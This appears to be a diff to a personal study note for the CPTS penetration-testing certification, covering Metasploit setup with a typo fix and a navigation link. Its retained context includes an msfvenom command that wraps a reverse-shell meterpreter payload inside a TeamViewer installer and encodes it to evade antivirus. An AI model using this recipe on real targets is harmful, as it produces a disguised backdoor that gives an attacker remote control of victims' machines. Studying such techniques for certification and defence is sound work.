@@ -6,6 +6,8 @@ tags:
   - packer
 ---
 
+[[Certifications/CPTS/Index|← CPTS]]
+
 
 ![[metasploit_overview.png]]
 
@@ -89,7 +91,7 @@ msf-virustotal -k <API key> -f TeamViewerInstall.exe
 
 ```bash
 # Setup dttatabase for msf
-sudo service postresql status 
+sudo service postgresql status 
 sudo systemctl start postgresql
 
 # Initialize
@@ -221,9 +223,6 @@ Type of Security Policies
 
 # example of msfvenom to create an executable 
 msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
-
-# How you can archive your payload 
-wgat 
 
 ```
 
